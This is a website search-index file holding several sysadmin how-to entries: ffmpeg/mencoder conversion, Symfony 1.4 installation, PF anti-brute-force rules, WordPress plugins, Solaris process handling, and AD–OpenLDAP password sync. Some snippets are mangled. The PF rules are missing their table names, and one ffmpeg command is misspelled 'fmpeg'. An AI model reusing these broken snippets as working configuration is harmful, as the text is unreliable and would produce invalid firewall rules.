                content: "Introduction linkmencoder is one of the most used applications along with ffmpeg to convert or encode videos.\nInstallation linkDepending on what you will use, select only the one you wish:\napt-get install mencoder ffmpeg If you want to create OGV (OGG/Theora) videos for HTML5, you need to install this package:\naptitude install ffmpeg2theora Usage linkConvert a .wmv to a .avi link mencoder \"/path/to/file.wmv\" -ofps 23.976 -ovc lavc -oac copy -o \"/path/to/file.avi\" Convert a .mp4 to a .avi link ffmpeg -i \"/path/to/file.mp4\" \"/path/to/file.avi\" And to convert an avi to mp4 and change to iPhone resolution:\nffmpeg -s 480x320 -i /path/to/file.avi /path/to/file_iphone.mp4 Convert a .flv to a .mpg link fmpeg -i get_video.flv -ab 56 -ar 22050 -b 500 -s 320x240 test.mpg The options are:\nb bitrate: set the video bitrate in kbit/s (default = 200 kb/s) ab bitrate: set the audio bitrate in kbit/s (default = 64) ar sample rate: set the audio samplerate in Hz (default = 44100 Hz) s size: set frame size. The format is WxH (default 160x128) Convert to ogv link ffmpeg2theora video.mov This will keep the same video information and create an ogv file with the same name.\nIf you want better quality:\nffmpeg2theora --optimize video.mov Resources linkhttp://soukie.net/degradable-html5-audio-and-video-plugin/#instr\nhttp://www.paperblog.fr/3023554/ffmpeg2theora-guide-par-l-exemple/\nhttp://doc.ubuntu-fr.org/ffmpeg\n"
            }
        );
    index.add(
            {
                id:  436 ,
                href: "\/Symfony_:_Installation_et_configuration_du_framework_PHP\/",
                title: "Symfony: Installation and Configuration of the PHP Framework",
                description: "A guide to install and configure the Symfony PHP framework, including prerequisites, installation steps, and basic project configuration.",
                content: "Introduction linkSymfony is a free MVC framework written in PHP 5. As a framework, it facilitates and accelerates the development of Internet and Intranet websites and applications.\nPrerequisites linkBefore starting, we need a web server of your choice (I’m using Apache2) and a database server (MySQL):\naptitude install apache2 libapache2-mod-php5 php5 mysql-server Symfony provides a small utility to test your server:\n\u003e wget http://sf-to.org/1.4/check.php \u003e php check_configuration.php ******************************** * * * symfony requirements check * * * ******************************** php.ini used by PHP: /etc/php5/cli/php.ini ** WARNING ** * The PHP CLI can use a different php.ini file * than the one used with your web server. * If this is the case, please launch this * utility from your web server. ** WARNING ** ** Mandatory requirements ** OK PHP version is at least 5.2.4 (5.2.6-1+lenny8) ** Optional checks ** OK PDO is installed [[WARNING]] PDO has some drivers installed: : FAILED *** Install PDO drivers (mandatory for Propel and Doctrine) *** OK PHP-XML module is installed [[WARNING]] XSL module is installed: FAILED *** Install and enable the XSL module (recommended for Propel) *** OK The token_get_all() function is available OK The mb_strlen() function is available OK The iconv() function is available OK The utf8_decode() is available OK The posix_isatty() is available [[WARNING]] A PHP accelerator is installed: FAILED *** Install a PHP accelerator like APC (highly recommended) *** [[WARNING]] php.ini has short_open_tag set to off: FAILED *** Set it to off in php.ini *** [[WARNING]] php.ini has magic_quotes_gpc set to off: FAILED *** Set it to off in php.ini *** OK php.ini has register_globals set to off OK php.ini has session.auto_start set to off OK PHP version is not 5.2.9 Clearly, there are some small issues. Let’s fix them now:\naptitude install php5-mysql php5-xsl php-apc perl -pe 's/^(short_open_tag = )on/\\1off/i' \u003c /etc/php5/cli/php.ini \u003e /tmp/sym_php_changes_tmp perl -pe 's/^(magic_quotes_gpc = )on/\\1off/i' \u003c /tmp/sym_php_changes_tmp \u003e /etc/php5/cli/php.ini Now, if we check again:\n\u003e php check_configuration.php ******************************** * * * symfony requirements check * * * ******************************** php.ini used by PHP: /etc/php5/cli/php.ini ** WARNING ** * The PHP CLI can use a different php.ini file * than the one used with your web server. * If this is the case, please launch this * utility from your web server. ** WARNING ** ** Mandatory requirements ** OK PHP version is at least 5.2.4 (5.2.6-1+lenny8) ** Optional checks ** OK PDO is installed OK PDO has some drivers installed: mysql OK PHP-XML module is installed OK XSL module is installed OK The token_get_all() function is available OK The mb_strlen() function is available OK The iconv() function is available OK The utf8_decode() is available OK The posix_isatty() is available OK A PHP accelerator is installed OK php.ini has short_open_tag set to off OK php.ini has magic_quotes_gpc set to off OK php.ini has register_globals set to off OK php.ini has session.auto_start set to off OK PHP version is not 5.2.9 Everything is ok :-)\nInstallation linkThere are several solutions to install Symfony. I personally chose SVN, but PEAR would have been just as good, or even the Sandbox (all-in-one). For this, I need to have SVN installed:\naptitude install subversion Next, we will create a space to place Symfony:\ncd /usr/share svn checkout http://svn.symfony-project.com/branches/1.4/ mv 1.4 symfony Then we’ll verify that everything is installed correctly:\nsymfony/data/bin/symfony -V symfony version 1.4.5-DEV (/usr/share/symfony/lib) Yippee :-)\nConfiguration linkLet’s update our PATH to easily use the new binaries:\nexport PATH=$PATH:/usr/share/symfony/data/bin Initializing a New Project linkLet’s imagine I have a project called ‘phpwol’. I’ll create my project folder and initialize it:\nmkdir -p /var/www/phpwol cd /var/www/phpwol symfony generate:project phpwol A lot of things have just been created:\nDirectory Description apps/ Contains all project applications cache/ Files cached by the framework config/ Project configuration files data/ Data files such as initial data sets lib/ Project libraries and classes log/ Framework log files plugins/ Installed plugins test/ Unit and functional test files web/ The Web root directory (see below) Resources linkhttp://www.symfony-project.org/getting-started/1_4/fr/\nhttp://www.lafermeduweb.net/tutorial/symfony-creer-un-site-web-avec-le-framework-php-symfony-14.html\n"
            }
        );
    index.add(
            {
                id:  437 ,
                href: "\/Packet_Filter:_Lutter_contre_le_bruteforce\/",
                title: "Packet Filter: Fighting Against Brute Force Attacks",
                description: "How to configure Packet Filter (PF) to protect against brute force attacks on services like SSH by automatically blacklisting suspicious IP addresses.",
                content: "Introduction linkYou’ve probably seen brute force connection attempts in your connection logs (sshd, httpd, ftpd, etc.). This is annoying, fills up your logs, and makes your server work harder than it needs to.\nFortunately, Daniel Hartmeier thought of you and added convenient options to his famous PacketFilter firewall, affectionately nicknamed PF. These options are ‘max-src-conn-rate’ and ‘max-src-conn’, which are used in combination with ‘overload’. These options are available in PF starting with OpenBSD 3.7, FreeBSD 6.0, and NetBSD 2.0.\nPF Configuration linkThis is configured in the PF configuration file, /etc/pf.conf. I’ll give an example for SSH, but the principle is the same for other ports.\nPreviously, to authorize SSH connections from outside, you would have a line that looked like this (with $external being the name of your external network interface):\npass in quick on $external inet proto tcp from any to any port ssh flags S/SA keep state Simply replace this line with:\ntable persist block in quick from pass in quick on $external inet proto tcp from any to any port ssh flags S/SA keep state ( max-src-conn-rate 2/10, overload flush global) In order:\nWe create a table that will store the attackers’ IPs We block everything coming from these IPs We allow SSH connections if there are fewer than 2 connection attempts in 10 seconds Otherwise, we register the IP in the table and destroy all connections corresponding to that IP Obviously, you can customize the frequency of connection attempts and also use ‘max-src-conn’ to limit the total number of connections from an IP.\nThat’s it - enjoy the tranquility, and say goodbye to mindless attacks!\nManaging Blacklisted IPs linkTo display the list of blacklisted IPs:\npfctl -t bruteforce -T show To remove a blacklisted IP or all IPs:\npfctl -t bruteforce -T delete @IP pfctl -t bruteforce -T flush Adding a Whitelist linkFor those who wish to add a whitelist, here are the lines to add:\ntable persist file \"/etc/ssh/whitelist\" pass in on $ext_if proto tcp from to $ext_if port 22 flags S/SA keep state Here, the /etc/ssh/whitelist file must be filled with the IPs to whitelist.\nConfiguration Example linkIf this isn’t clear enough, here’s a configuration example:\n# $OpenBSD: pf.conf,v 1.34 2007/02/24 19:30:59 millert Exp $ # # See pf.conf(5) and /usr/share/pf for syntax and examples. # Remember to set net.inet.ip.forwarding=1 and/or net.inet6.ip6.forwarding=1 # in /etc/sysctl.conf if packets are to be forwarded between interfaces. ext_if=\"trunk0\" set skip on lo scrub in all # Whitelist / Blacklist table table persist table persist file \"/etc/ssh/whitelist\" # Block SSH bruteforce pass in on $ext_if proto tcp from ! to $ext_if port 22 \\ flags S/SA keep state \\ (max-src-conn-rate 3/60, \\ overload flush global) # Allow Whitelist pass in on $ext_if proto tcp from to $ext_if port 22 flags S/SA keep state # Block the ssh bruteforce bastards block drop in on $ext_if from pass in on $ext_if from # Allow all outbound traffic : pass out inet proto tcp from $ext_if to any flags S/SA keep state pass out inet proto { udp, icmp } from $ext_if to any keep state Here, the last rule between whitelist and blacklist is whitelist. This is because the last matching rule takes precedence. This allows us to connect even if we get blacklisted because we failed to connect after x attempts, as long as we’re in the whitelist.\nDon’t forget to reload the configuration:\npfctl -f /etc/pf.conf References linkhttp://www.openbsd.org/faq/pf/fr/filter.html\nhttp://wiki.gcu.info/doku.php?id=bsd:pf_et_bruteforce\u0026s=ssh\n"
            }
        );
    index.add(
            {
                id:  438 ,
                href: "\/Wordpress_:_les_extentions_pratiques\/",
                title: "WordPress: Useful Extensions",
                description: "A collection of useful WordPress plugins and extensions that can enhance your website's functionality.",
                content: "Introduction linkWordPress is, in my opinion, THE ultimate blogging platform. Like Firefox, it really shines with its plugins. Here’s my list of plugins that I currently use or have used in the past that I find interesting.\nTips linkAdding File Extensions for Upload linkYou may have noticed that you can’t upload just anything to WordPress, which can be frustrating. By looking into the source code, you can add more extensions. For example, I needed to add the ogv format:\n/** * Retrieve list of allowed mime types and file extensions. * * @since 2.8.6 * * @return array Array of mime types keyed by the file extension regex corresponding to those types. */ function get_allowed_mime_types() { static $mimes = false; if ( !$mimes ) { // Accepted MIME types are set here as PCRE unless provided. $mimes = apply_filters( 'upload_mimes', array( 'jpg|jpeg|jpe' =\u003e 'image/jpeg', 'gif' =\u003e 'image/gif', 'png' =\u003e 'image/png', 'bmp' =\u003e 'image/bmp', 'tif|tiff' =\u003e 'image/tiff', 'ico' =\u003e 'image/x-icon', 'asf|asx|wax|wmv|wmx' =\u003e 'video/asf', 'avi' =\u003e 'video/avi', 'divx' =\u003e 'video/divx', 'flv' =\u003e 'video/x-flv', 'ogv' =\u003e 'video/ogg', ... The Extensions linkiWPhone linkThis extension automatically resizes the site to the correct format (iPhone) when accessing the WordPress site. It’s very convenient because everything is automatic, with no need to modify the pages :-)\nhttp://iwphone.contentrobot.com/\nPS: Don’t forget to install the WordPress plugin on your iPhone via the App Store, which will allow you to post messages very easily.\nContact Form 7 linkThis handy plugin allows you to create forms easily. If you encounter an error like “The database table for Contact Form 7 does not exist”, simply temporarily add all rights, long enough for it to create the table, then reset everything.\nNextGen Gallery linkThis plugin is truly amazing. Flash slideshows, 3D photo walls with Cooliris, etc. It’s perfect for displaying photos and creating impressive slideshows.\nAdding Flash to the Header linkModify your header file for your current theme and add this:\n\u003c?php $showgallery = '[slideshow=1]'; $showgallery = apply_filters('the_content', $showgallery); echo $showgallery; ?\u003e You obviously need to have a photo gallery to display and set the corresponding number for the slideshow value.\n"
            }
        );
    index.add(
            {
                id:  439 ,
                href: "\/Manager_les_processes_Solaris\/",
                title: "Managing Solaris Processes",
                description: "A comprehensive guide to managing processes in Solaris operating system, including monitoring with prstat, killing processes, and dealing with zombie processes.",
                content: "Introduction linkA process is any program that is running on the system. All processes are assigned a unique process identification (PID) number, which is used by the kernel to track and manage the process. The PID numbers are used by the root and regular users to identify and control their processes.\nprstat linkThe prstat command examines and displays information about active processes on the system.\nThis command enables you to view information by specific processes, user identification (UID) numbers, central processing unit (CPU) IDs, or processor sets. By default, the prstat command displays information about all processes sorted by CPU usage. To use the prstat command, perform the command:\n# prstat PID USERNAME SIZE RSS STATE PRI NICE TIME CPU PROCESS/NLWP 1641 root 4864K 4520K cpu0 59 0 0:00:00 0.5% prstat/1 1635 root 1504K 1168K sleep 59 0 0:00:00 0.3% ksh/1 9 root 6096K 4072K sleep 59 0 0:00:29 0.1% svc.configd/11 566 root 82M 30M sleep 29 10 0:00:36 0.1% java/14 1633 root 2232K 1520K sleep 59 0 0:00:00 0.1% in.rlogind/1 531 root 8200K 2928K sleep 59 0 0:00:12 0.1% dtgreet/1 474 root 21M 7168K sleep 59 0 0:00:11 0.1% Xsun/1 236 root 4768K 2184K sleep 59 0 0:00:03 0.0% inetd/4 86 root 3504K 1848K sleep 59 0 0:00:01 0.0% nscd/24 7 root 5544K 1744K sleep 59 0 0:00:06 0.0% svc.startd/12 154 root 2280K 824K sleep 59 0 0:00:01 0.0% in.routed/1 509 root 6888K 2592K sleep 59 0 0:00:02 0.0% httpd/1 240 root 5888K 1256K sleep 59 0 0:00:01 0.0% sendmail/1 145 root 2944K 816K sleep 59 0 0:00:01 0.0% httpd/1 347 daemon 2608K 776K sleep 59 0 0:00:00 0.0% nfsmapid/3 206 root 1288K 600K sleep 59 0 0:00:00 0.0% utmpd/1 344 daemon 2272K 1248K sleep 60 -20 0:00:00 0.0% nfsd/2 241 smmsp 5792K 960K sleep 59 0 0:00:00 0.0% sendmail/1 107 root 2584K 784K sleep 59 0 0:00:00 0.0% syseventd/14 123 root 3064K 880K sleep 59 0 0:00:00 0.0% picld/4 146 lp 2976K 448K sleep 59 0 0:00:00 0.0% httpd/1 Total: 53 processes, 171 lwps, load averages: 0.02, 0.04, 0.07 To quit the prstat command, type q.\nThe table shows the column headings and their meanings in a prstat report. Column Headings for the prstat Report.\nDefault Column Heading Description PID The PID number of the process. USERNAME The login name or UID of the owner of the process. SIZE The total virtual memory size of the process. RSS The resident set size of the process in kilobytes, megabytes, or gigabytes. STATE The state of the process:\n* cpu - The process is running on the CPU.\n* sleep - The process is waiting for an event to complete.\n* run - The process is in the run queue.\n* zombie - The process terminated, and the parent is not waiting.\n* stop - The process is stopped. PRI The priority of the process. NICE The value used in priority computation. TIME The cumulative execution time for the process. CPU The percentage of recent CPU time used by the process. PROCESS/NLWP The name of the process/the number of lightweight processes (LWPs) in the process. Note: The kernel and many applications are now multithreaded. A thread is a logical sequence of program instructions written to accomplish a particular task. Each application thread is independently scheduled to run on an LWP, which functions as a virtual CPU. LWPs in turn, are attached to kernel threads, which are scheduled to run on actual CPUs.\nNote: Use the priocntl(1) command to assign processes to a priority class and to manage process priorities. The nice(1) command is only supported for backward compatibility to previous Solaris OS releases. The priocntl command provides more flexibility in managing processes.\nThe table shows the options for the prstat command.\nOption Description -a Displays separate reports about processes and users at the same time. -c Continuously prints new reports below previous reports. -n nproc Restricts the number of output lines. -p pidlist Reports only on processes that have a PID in the given list. -s key Sorts output lines by key in descending order. The five possible keys include: cpu, time, size, rss, and pri. You can use only one key at a time. -S key Sorts output lines by key in ascending order. -t Reports total usage summary for each user. -u euidlist Reports only processes that have an effective user ID (EUID) in the given list. -U uidlist Reports only processes that have a real UID in the given list. Kill Frozen Process linkYou use the kill or pkill commands to terminate one or more processes.\nThe format for the kill command is:\nkill -signal PID To show all of the available signals used with the kill command:\nkill -l The format for the pkill command is:\npkill -signal Process Before you can terminate a process, you must know its name or PID. Use either the ps or pgrep command to locate the PID for the process.\nThe following examples uses the pgrep command to locate the PID for the mail processes.\n# pgrep -l mail 241 sendmail 240 sendmail # pkill sendmail The following examples use the ps and pkill commands to locate and terminate the sendmail process.\n# ps -e | grep sendmail 241 ? 0:00 sendmail 240 ? 0:02 sendmail # kill 241 To terminate more than one process at the same time, use the following syntax:\nkill -signal PID PID PID PID pkill signal process process You use the kill command without a signal on the command line to send the default Signal 15 to the process. This signal usually causes the process to terminate.\nThe table shows some signals and names.\nSignal Number Signal Name Event Default Action 1 SIGHUP Hangup Exit 2 SIGINT Interrupt Exit 9 SIGKILL Kill Exit 15 SIGTERM Terminate Exit 1, SIGHUP - A hangup signal to cause a telephone line or terminal connection to be dropped. For certain daemons, such as inetd and in.named, a hangup signal will cause the daemon to reread its configuration file. 2, SIGINT - An interrupt signal from your keyboard–usually from a Control-C key combination. 9, SIGKILL - A signal to kill a process. A process cannot ignore this signal. 15, SIGTERM - A signal to terminate a process in an orderly manner. Some processes ignore this signal. A complete list of signals that the kill command can send can be found by executing the command kill -l, or by referring to the man page for signal:\nman -s3head signal Some processes can be written to ignore Signal 15. Processes that do not respond to a Signal 15 can be terminated by force by using Signal 9 with the kill or pkill commands. You use the following syntax:\nkill -9 PID pkill -9 process Caution: Use the kill -9 or pkill -9 command as a last resort to terminate a process. Using the -9 signal on a process that controls a database application or a program that updates files can be disastrous. The process is terminated instantly with no opportunity to perform an orderly shutdown.\nWhen a workstation is not responding to your keyboard or mouse input, the CDE might be frozen. In such cases, you may be able to remotely access your workstation by using the rlogin command or by using the telnet command from another system. Killing the Process for a Frozen Login\nAfter you are connected remotely to your system, you can invoke the pkill command to terminate the corrupted session on your workstation.\nIn the following examples, the rlogin command is used to log in to sys42, from which you can issue a pkill or a kill command.\n# rlogin sys-02 Password: Last login: Sun Oct 24 13:44:51 from sys-01 Sun Microsystems Inc. SunOS 5.10 s10_68 Sep. 20, 2004 # pkill -9 Xsun or\n# ps -e | grep Xsun 442 ? 0:01 Xsun # kill -9 442 Kill Zombie Processes linkSometimes we encounter processes called zombies. Nothing to do with a George A. Romero movie, it’s a much more prosaic phenomenon. When a process ends, almost all associated resources are released, except for the corresponding entry in the OS process table. The reason is simple: the parent process must be able to retrieve the return code of its child process, so we cannot abruptly erase everything.\nTypically, the entry is removed from the process table when the parent retrieves this return code, which is called reaping (the Reaper being our Grim Reaper). If the parent process, for one reason or another, does not read this code, the entry remains in the process table. Let’s see what these zombies look like, and how to get rid of them.\nIn itself, it’s generally not very troublesome, since apart from the entry in the process table, there’s nothing left: no memory consumed, no CPU used. However, I see two disadvantages:\nthe process table has a limited size (30000 entries by default), and each zombie occupies a spot, so if many are generated, this can become problematic on a busy system the zombie is really, really ugly (and it doesn’t smell good either) Fortunately, it is possible to substitute for the negligent parent and finally allow these zombies to find eternal rest. Let’s first see how a zombie appears on the system:\n$ ps -edf Or:\n$ ps -ecl To remove them, we’ll use the preap command:\n$ preap 7450 7450: exited with status 0 $ preap 7542 7542: exited with status 0 $ preap 7544 7544: exited with status 0 $ preap 7546 7546: exited with status 0 $ ps -edf | grep defunct And there you have it, much more effective than the hero of Brain Dead! Note, if you want to manually create a zombie for your tests, you can use the following command, provided by the excellent c0t0d0s0.org:\nnohup perl -e \"if (fork()\u003e0) {while (1) {sleep 100*100;};};\" "
            }
        );
    index.add(
            {
                id:  440 ,
                href: "\/Mise_en_place_d\u0027une_solution_de_Syncronisation_entre_ActiveDirectory_et_OpenLDAP\/",
                title: "Setting up a Synchronization Solution between ActiveDirectory and OpenLDAP",
                description: "This guide explains how to set up a synchronization solution between Active Directory and OpenLDAP, including server configuration, client setup, and password synchronization mechanisms.",
                content: "Introduction linkThis documentation is quite technically advanced, which is why you need some basic knowledge before attempting it. I recommend reading this documentation first.\nFor authentication, we want to use an OpenLDAP directory as a cache/backup of an Active Directory (AD) server. Authentication will be performed from different applications and Unix-type machines. The goal is also to be able to continue authenticating in case of an AD crash.\nNote: Because objectively, in case of a crash, here are the approximate reinstallation and restore times:\nLinux: ~30 min Windows: ~4 h The choice is quickly made, and this solution truly holds up. (Pure Windows users who say Windows never crashes can leave now!)\nSome other information can be stored locally in OpenLDAP.\nTo simplify installation on the Unix side (Linux or Solaris), Microsoft SFU is installed on AD, which allows maintaining Unix account information such as gid/uid/homedirectory, shell… (this will modify the AD schema).\nTo access the user passwords contained in AD (unicodePwd), the connection between the OpenLDAP server and AD will be encrypted via SSL. This is the only way to send requests to AD that touch this attribute. PS: This does not allow reading it, only modifying it.\nThis document will present the installation for the most advanced configuration. This allows you to have an independent OpenLDAP server with content synchronized in different ways: by a Python script for all attributes of all entries, by SSOD for Unix and Samba passwords, and by PAM for Unix and Samba passwords.\nInstallation linkServer linkFor the installation, we’ll use a Debian system:\napt-get install ldap-server ldap-client python-ldap For SSOD:\napt-get install libpam-ldap For Samba:\napt-get install libpam-smbpass libnss-ldap During installation, it will ask you what root password you want for OpenLDAP.\nSSOD is a utility written by Microsoft with source code downloadable from these pages:\nhttp://www.google.fr/search?q=+ssod.tar.gz http://www.microsoft.com/windowsserver2003/R2/unixcomponents/idmu.mspx However, the code provided in this file is not portable and does not work on 64-bit systems… I had to modify these sources to make it portable.\nWindows linkFor Windows, you need a DNS server, a configured AD, and the small SFU that you will need to download and install.\nDuring installation, you can perform a custom installation and check only:\nPassword synchronization NIS server Then start the installation.\nLaunch the Unix Services Configuration utility and configure it like this: Click apply.\nAdd your OpenLDAP server here: Click apply.\nThen, if you already have a MASTER (like DELL1800 here), connect to the utility on the master and add it. Otherwise, if this server must serve as the master, add it in this MMC: Click apply.\nThen you’ll need to reboot and you’re done.\nClients linkConfiguration linkServer linkslapd.conf linkFor the following information\nEdit the configuration file /etc/ldap/slapd.conf and add these lines:\n# Schema and objectClass definitions include /etc/ldap/schema/core.schema include /etc/ldap/schema/cosine.schema include /etc/ldap/schema/nis.schema include /etc/ldap/schema/inetorgperson.schema include /etc/ldap/schema/microsoft.schema include /etc/ldap/schema/microsoft.sfu.schema include /etc/ldap/schema/microsoft.exchange.schema # For samba include /etc/ldap/schema/samba.schema So here we have the schemas so that OpenLDAP can recognize the different Microsoft attributes. We also include Samba (because we also want to integrate Samba with OpenLDAP).\nThe Samba schema is in /usr/share/doc/samba-doc/examples/LDAP and should be copied to /etc/ldap/schema, but first you need to install a package for Samba:\napt-get install samba-doc cp /usr/share/doc/samba-doc/examples/LDAP/samba.schema /etc/ldap/schema/samba.schema We specify where the AD synchronization base will be stored:\n# Where the database file are physically stored for database #1 directory \"/var/lib/ldap/copy-ad\" We add indexes on uid, sn, cn, gid… fields to speed up searches for these fields:\n# Indexing options for database #1 index objectClass eq index cn,sn,uid,mail pres,eq,sub index mailnickname,userprincipalname,proxyaddresses pres,eq,sub Now configure your AD domain and the encrypted password (see basic ldap documentation):\n# The base of your directory in database #1 suffix \"dc=openldap,dc=mydomain,dc=local\" # rootdn directive for specifying a superuser on the database. This is needed # for syncrepl. rootdn \"cn=admin,dc=openldap,dc=mydomain,dc=local\" rootpw {SSHA}V2c83+XHO/DNrUjeNjyTwAA9W+yKm/4h access to attrs=userPassword,shadowLastChange by dn=\"cn=admin,dc=mydomain,dc=local\" write by anonymous auth by self write by * none access to * by dn=\"cn=admin,dc=openldap,dc=mydomain,dc=local\" write by * read Which gives something like this:\ninclude /etc/ldap/schema/core.schema include /etc/ldap/schema/cosine.schema include /etc/ldap/schema/nis.schema include /etc/ldap/schema/inetorgperson.schema include /etc/ldap/schema/microsoft.schema include /etc/ldap/schema/microsoft.sfu.schema include /etc/ldap/schema/microsoft.exchange.schema include /etc/ldap/schema/samba.schema pidfile /var/run/slapd/slapd.pid argsfile /var/run/slapd/slapd.args loglevel 0 modulepath /usr/lib/ldap moduleload back_bdb sizelimit 500 tool-threads 1 backend bdb checkpoint 512 30 database bdb suffix \"dc=openldap,dc=mydomain,dc=local\" rootdn rootdn \"cn=admin,dc=openldap,dc=mydomain,dc=local\" rootpw {SSHA}V2c83+XHO/DNrUjeNjyTwAA9W+yKm/4h directory \"/var/lib/ldap/copy-ad\" dbconfig set_cachesize 0 2097152 0 dbconfig set_lk_max_objects 1500 dbconfig set_lk_max_locks 1500 dbconfig set_lk_max_lockers 1500 index objectClass eq index cn,sn,uid,mail pres,eq,sub index mailnickname,userprincipalname,proxyaddresses pres,eq,sub lastmod on access to attrs=userPassword,shadowLastChange by '''dn=\"cn=admin,dc=openldap,dc=mydomain,dc=local\" write by anonymous auth by self write by * none access to dn.base=\"\" by * read access to * by dn=\"cn=admin,dc=openldap,dc=mydomain,dc=local\" write by * read slapd.conf proxy linkIn case we want our LDAP server to serve as a proxy, we need to load the back_meta module:\n# Where the dynamically loaded modules are stored modulepath /usr/lib/ldap moduleload back_bdb moduleload back_meta And configure properly to contain the information from the Active Directory server:\n####################################################################### database meta suffix \"dc=ad,dc=mydomain,dc=local\" uri \"ldap://192.168.0.30/dc=ad,dc=mydomain,dc=local\" suffixmassage \"dc=ad,dc=mydomain,dc=local\" \"dc=mydomain,dc=local\" rootdn \"cn=admin,dc=ad,DC=mydomain,DC=local\" # local admin account rootpw {SSHA}V2c83+XHO/DNrUjeNjyTwAA9W+yKm/4h # local password #acl-authcDN \"CN=Administrateur,CN=Users,DC=mydomain,DC=local\" #acl-passwd {SSHA}V2c83+XHO/DNrUjeNjyTwAA9W+yKm/4h access to attrs=userPassword,shadowLastChange by dn=\"CN=Administrateur,CN=Users,DC=ad,DC=mydomain,DC=local\" write by anonymous auth by self write by * none access to dn.base=\"\" by * read # The admin dn has full write access, everyone else # can read everything. access to * by dn=\"CN=Administrateur,CN=Users,DC=ad,DC=mydomain,DC=local\" write by * read # Save the time that the entry gets modified, for database #1 lastmod on cachesize 20 directory /var/lib/ldap/real-ad index objectClass eq index cn,sn,uid,mail pres,eq,sub Schemas linkWe’ll copy the schemas to the right place. Download the archive:\nMicrosoft Schemas\nNow we decompress:\nmv Microsoft_shema.tgz /etc/ldap/schema cd /etc/ldap/schema tar -xzvf Microsoft_shema.tgz rm Microsoft_shema.tgz We’ll create the folders associated with the location where the AD base will be stored:\nmkdir -p /var/lib/ldap/copy-ad chown -Rf openldap. /var/lib/ldap/copy-ad And now we can restart the LDAP server:\n/etc/init.d/slapd restart SSOD linkThe advantage of SSOD is that password synchronization is done in real time.\nThis synchronization can be done via PAM, which allows updating any backend or password type (LDAP, shadow, Samba, Kerberos, …)\nThis last point is very interesting for synchronizing passwords for Samba servers that use their own LDAP attributes to store passwords.\nIndeed, we can use both pam_smbpass and SSOD to fill the sambaNTPassword, sambaLMPassword and other associated attributes when a password is changed on the AD server.\nSSOD compilation The SSOD utility provided by Microsoft does not work in 64 bits. I therefore had to modify the source code, and it is this modified version that should be used.\nConfiguration linkTo compile SSOD, the packages g++ and libpam0g-dev must be installed:\napt-get install g++ libpam0g-dev Download these sources available here:\nunzip ssod-src.zip cd sfu/tripldes make -f make3des.debian clean make -f make3des.debian cd ../ssod make -f makessod.debian clean make -f makessod.debian We get a binary in bin/ssod.l52.\nInstallation linkCopy the binary obtained after compiling to /usr/bin/ssod on the server where OpenLDAP is installed.\nDownload the file ssod-conf.tgz to /tmp and decompress it while in the root directory:\ncd / tar zxvf /tmp/ssod-conf.tgz This will install the startup and shutdown file in /etc/init.d, the corresponding links to the different runlevels in /etc/rc?.d and finally the daemon configuration file in /etc/sso.conf.\nThe various possible options are available on this page:\nhttp://technet2.microsoft.com/windowsserver/en/library/3f2ac52d-e9b3-4c8a-bc1d-a4e3adde91191033.mspx?mfr=true\nBy default, the configuration is as follows:\nSYNC_HOSTS=(192.168.0.30) FILE_PATH=/etc ENCRYPT_KEY=ABCDZ#efgh$12345 CASE_IGNORE_NAME=0 USE_NIS=0 USE_SHADOW=0 TEMP_FILE_PATH=/tmp SYNC_USERS=ALL SYNC_RETRIES=5 SYNC_DELAY=0 PORT_NUMBER=6677 NIS_UPDATE_PATH=bidon SYNC_HOSTS must contain the name or IP address of the AD server with which you want to synchronize. ENCRYPT_KEY must be identical to what is indicated in the SFU configuration on the AD server. PORT_NUMBER must contain the port number used by SFU on the AD server. With this configuration file, SSOD is configured to update passwords using PAM. So you need to create a file corresponding to the SSOD service in the PAM configuration directory (/etc/pam.d). A priori, this file is a copy of /etc/pam.d/passwd. So:\ncp /etc/pam.d/passwd /etc/pam.d/ssod /etc/pam.d/ssod normally contains an include directive for the file /etc/pam.d/common-password-ldap. The content of the latter varies according to the desired functionality. A priori it should reference the pam-ldap and possibly pam-smbpass modules.\nOnce the installation of SSOD and the various PAM modules necessary for your configuration is complete, you can verify that the SSOD daemon is working correctly by modifying a password on AD and checking the file /var/log/auth.log on the server where SSOD is running. You should see a line like:\nSuccessfully updated password via PAM User: dummyuser for each changed password.\nConfiguration libpam-ldap and libnss-pam linkRefer to the chapter of the same name in the client configuration part concerning the files /etc/nsswitch.conf, /etc/libnss-ldap.* and /etc/pam_ldap.conf\nConfiguration/use of libpam-smbpass linkFor this module to work, you must configure libnss-pam, otherwise the execution of pam-smbpass.so will end with a core dump :(. This module must be able to find the information of users and/or groups that are in the LDAP directory.\nThe file /etc/samba/smb.conf must be configured to use the LDAP backend. See the chapter relating to the Samba configuration.\nLibpam-smbpass allows authentication using the sambaNTPassword and/or sambaLMPassword attributes. It also allows updating these attributes when the password is changed or when a user logs in after being authenticated by a third-party module (pam_ldap for example). It is these last two functionalities that particularly interest us. Indeed, to be able to authenticate with Samba servers, these attributes must be filled and these are a priori the only ways to fill them.\nTo synchronize Samba passwords from those contained in the LDAP directory when a user authenticates, you must modify the file /etc/pam.d/common-auth-ldap. It should contain:\nauth required pam_nologin.so auth sufficient pam_unix.so nullok_secure auth optional pam_smbpass.so migrate use_first_pass auth sufficient pam_ldap.so use_first_pass auth required pam_deny.so To modify Samba passwords when a user changes their password on AD or on a Unix machine, you must modify the file /etc/pam.d/common-password-ldap. It should contain:\npassword required pam_smbpass.so migrate password sufficient pam_ldap.so try_first_pass password sufficient pam_unix.so try_first_pass nullok obscure min=4 max=8 md5 password required pam_deny.so Synchronization script linkNow at the crontab level, we’ll add a small script that will allow us to do the sync. Edit the script and modify it according to your needs:\nAD import script\nPut the script archive somewhere and decompress it:\nmv Ad_import.tgz /etc/scripts/ cd /etc/scripts/ tar -xzvf Ad_import.tgz chmod 755 ad_import.py rm Ad_import.tgz You can edit the script and modify the following variables:\nLOGLEVEL: contains an integer. The larger the integer, the more verbose the script is GENLDIF: 0 or 1. If it’s 1, the script generates an LDIF file containing the modified LDAP entries intended for the OpenLDAP server SYNCHRONIZE: 0 or 1. If it’s 1, the script directly modifies the entries on the OpenLDAP server LOGSTDOUT: 0 or 1. If it’s 1, the script displays its messages on standard output. FULLSYNC: 0 or 1. If it’s 1, the script retrieves all entries contained in AD, otherwise it only retrieves those that have been modified since the last synchronization (incremental). If you change the source AD server (or do a complete sync), you must either set this variable to 1, or set the uSNChanged attribute of the base DN in your OpenLDAP directory to 0. src*: various parameters to connect to the source server. srcuri: URI of the source server srcadmin: DN of the user used for replication srcpassword: his password srcbasedn: the base of the hierarchy to synchronize. dst*: same as above but for the target server dstsamba: where to store info about the samba domain. Then we add it to the crontab and run it every 10 min:\n*/10 * * * * python /etc/scripts/ad_import.py Clients linkIn general, Unix clients can authenticate using the information contained in the LDAP directory 